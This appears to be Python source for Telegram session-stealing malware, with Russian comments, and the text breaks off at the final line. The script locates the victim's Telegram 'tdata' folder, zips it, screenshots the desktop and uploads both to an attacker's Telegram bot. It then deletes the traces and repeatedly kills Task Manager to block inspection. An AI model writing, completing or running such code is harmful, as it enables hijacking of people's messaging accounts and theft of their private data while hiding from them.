import os
import zipfile
import pyautogui
import psutil
import time
from datetime import datetime
from telegram import Bot
import logging

# Настройка логирования
logging.basicConfig(level=logging.INFO)

def find_tdata_folder(start_path):
    """Ищет папку tdata в указанной директории и всех её поддиректориях."""
    for root, dirs, files in os.walk(start_path):
        if 'tdata' in dirs:
            return os.path.join(root, 'tdata')
    return None

def zip_folder(folder_path):
    """Архивирует указанную папку в формате ZIP с добавлением даты к имени файла."""
    date_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_filename = f"{folder_path}_{date_str}.zip"
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(folder_path, '..')))
    return zip_filename

def send_file_to_telegram(bot_token, chat_id, file_path):
    """Отправляет файл в Telegram-чат."""
    bot = Bot(token=bot_token)
    try:
        with open(file_path, 'rb') as file:
            bot.send_document(chat_id=chat_id, document=file)
        logging.info(f"Файл {file_path} успешно отправлен в Telegram.")
    except Exception as e:
        logging.error(f"Ошибка при отправке файла {file_path}: {e}")

def capture_screenshot(path):
    """Захватывает скриншот и сохраняет его в указанной директории."""
    screenshot = pyautogui.screenshot()
    filename = os.path.join(path, f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
    screenshot.save(filename)
    return filename

def kill_process(process_name):
    """Завершает процесс по имени."""
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.info['name'] == process_name:
            logging.info(f"Завершение процесса {process_name} с PID {proc.info['pid']}.")
            proc.terminate()  # Завершает процесс
            proc.wait()  # Ждет завершения процесса
            logging.info(f"Процесс {process_name} завершен.")
            return True
    logging.info(f"Процесс {process_name} не найден.")
    return False

def monitor_process(process_name):
    """Постоянно проверяет, запущен ли процесс, и завершает его, если он найден."""
    while True:
        if kill_process(process_name):
            time.sleep(1)  # Ждем 1 секунду перед следующей проверкой
        else:
            time.sleep(1)  # Ждем 1 секунду перед следующей проверкой

def main():
    # Укажите путь для поиска папки tdata
    start_path = os.path.expanduser("~")  # Начинаем поиск из домашней директории

    # Запускаем мониторинг процесса 123.exe в отдельном потоке
    import threading
    process_monitor_thread = threading.Thread(target=monitor_process, args=('taskmgr.exe',), daemon=True)
    process_monitor_thread.start()

    # Ищем папку tdata
    tdata_folder = find_tdata_folder(start_path)
    
    if tdata_folder:
        # Архивируем папку tdata
        zip_filename = zip_folder(tdata_folder)

        # Захватываем скриншот
        screenshot_filename = capture_screenshot(start_path)

        # Укажите токен вашего бота и ID чата
        bot_token = '123443289:ABCdefGHIjklMNOpqrSTUvwxYZ'  # Пример токена бота
        chat_id = '987654321'  # Пример ID чата

        # Отправляем архив и скриншот в Telegram
        send_file_to_telegram(bot_token, chat_id, zip_filename)
        send_file_to_telegram(bot_token, chat_id, screenshot_filename)

        # Удаляем временные файлы
        os.remove(zip_filename)
        os.remove(screenshot_filename)
    else:
        logging.warning("Папка tdata не найдена.")

if __

